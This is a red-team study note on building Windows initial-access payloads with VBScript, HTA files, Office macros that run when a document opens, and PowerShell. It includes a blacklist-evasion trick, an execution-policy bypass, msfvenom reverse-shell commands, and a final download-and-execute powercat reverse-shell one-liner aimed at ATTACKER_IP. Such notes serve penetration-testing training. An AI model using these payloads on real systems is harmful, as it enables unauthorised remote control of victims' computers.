# Crafting Payloads
This will focus on creating payloads on a variety of built in scripting technologies, rather than the typical .exe
## WSH
Windows Scripting Host is a built-in windows administration tool that runs batch files to automate and manage tasks within the operating system. It is a Windows native engine `cscript.exe` (for command-line scripts) and `wscript.exe` (for UI scripts), which are responsible for executing various VBScripts including `vbs` and `vbe`. It is important to note that the VBScript engine runs and executes applications with the same level of access and permission as a regular user.

--- 
Now a simple VBScript code to create a windows message box that displays a message:
```VBScript
Dim message
message = "hallo world"
MsgBox message
```
Then we use `wscripts` in the cmd to run it
```
wscript hello.vbs
```

---
We can also use VBScript to run executable files for things like PoC.
```vbscript
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe"),1,True 
```
Here, we first create an object of the `WScript` library to call the execution payload, which serves like a cmd. Then utilize the `Run` method to execute the payload, which in this case is the `calc.exe`, or run any other command that we want. And also set the Window Style to `1` which means that it would be visible (We can instead use a `0` to hide the window and run the program in the background) and finally set the Wait for Completion value to `True` To wait until the command completes to continue execution Again to run it `wscript PoC.vbs` in the cmd. We can also use `cscript`.

--- 
If the `.vbs` are blacklisted, then we rename the file to `.txt` and run it with `wscript` like this
```
wscript /e:VBScript C:\Users\red\Desktop\payload.txt
```

## HTA
HTML Application, it allows us to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic `HTML` pages containing JScript and VBScript. The [LOLBINS](https://lolbas-project.github.io) tool `mshta` is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer.

--- 
We can use `ActiveXObject` in our payload as a PoC to execute cmd.exe
```html

<html>
<body>
<script>
	var c = 'cmd.exe'
	new ActiveXObject('WScript.shell').run(c)
</script>
</body>
</html>
```
Then we need to server the payload from a webserver, this can be done with a python server
```sh
python3 -m http.server
```
and just browsing to the payload will automatically download the file, and when ran it will open the cmd on the target machine

---
We can also craft payloads for reverse connections with the help of Metasploit
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f hta-psh -o shell.hta
```
Now when the target opens the file it will create a connection to our listener

---
We can also use Metasploit to generate and server an HTA file. By opening `msfconsole` and going to `exploit/windows/hta_server` we can configure it to create both the file and the webserver. The only difference from a normal listener will be that we need to set `SRVHOST` which will be the IP of the server from which we will host the file. 
## VBA
Visual Basic for Applications,a programming language implemented fro Microsoft applications such as Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications. 
Macros are Microsoft Office applications that contain embedded code written in VBA. It is used to create custom functions to speed up manual tasks.

---
We can take advantage of macros to create malicious Microsoft documents. (We can found macros under the view tab on each application). Once here we can create our macro, note that we need to select for which document that macro will be used in the `Macros in` drop down list.
Now we can start coding, at the start it will display us a simple function with the same name of our macro
```vb
Sub Test()
'
'
' Test Macro
'
'
End Sub
```
We can add a simple message pop up with the following, and run it with either F5 or `Run`
```vb
Sub Test()
	MsgBox("Hallo")
End Sub
```
Now in order to execute the VBS code automatically once the document gets opened we can use built-in functions such as `AutoOpen` and `Document_open`.
```vb
Sub Document_Open()
  test
End Sub

Sub AutoOpen()
  test
End Sub

Sub test()
   MsgBox ("Hallo there")
End Sub
```
It is important to note that to make the macro work we need to save the document in a Macro-Enabled format such as `.doc` or `.docm`. Now once we reopen the document file, Word will show a security message indicating that "Macros have been disabled" as they are by default, and just by clicking on "Enable content" our macro will get executed. And the option will remain persistent tr

---
For a quick PoC and we could take advantage of `Wscript` once again
```vb
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run (payload),1
End Sub
```
Similar to [[Payload Delivery#WSH|WSH]] the 1 after the payload means that the payload will run as a visible windows (0 for not visible). 

---
Like with all others, we can use msfvenom to create payloads
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f vba
```

---
Also, is worth noting that a reverse shell from this method, will only last as long as the document remains open, so as soon as we get a connection we should try to migrate the process, we can do this inside the session in Metasploit with
```
run post/windows/manage/migrate
```
## PSH
PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime in `.NET` with some exceptions for legacy uses. Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations and many others.

---
We can start by creating a simple PSH script
```powershell
Write-Output "Hallo there"
```
We save the file as a `.ps1`, and we can run it inside the cmd with
```
powershell -File file.ps1
```
Now, probably it will throw an error due to PowerShell's execution policy. By default this execution policy is set to `Restricted`, meaning that it permits individual commands but not run any scripts. We can change this by running the following in the PowerShell CLI
```powershell
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```
Microsoft also provides ways to disable this restriction. One of these is to give an argument option to the PowerShell command to change into to our desired setting. For example, we could change it to `bypass` policy, so it is not blocked or restricted. So the command will look like this
```
powershell -ex bypass -File file.ps1
```

---
Now, we can try getting a reverse shell using one of the tools written in PowerShell [Powercat](https://github.com/besimorhino/powercat). We can download it from GitHub and run a webserver to deliver it.
```shell
git clone https://github.com/besimorhino/powercat.git
cd powercat
python3 -m http.server 8080
```
Then we set up our [[Netcat]] listener and from the target machine we download the payload and execute it using PowerShell
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP:8080/powercat.ps1');powercat -c ATTACKER_IP -p 443 -e cmd"
```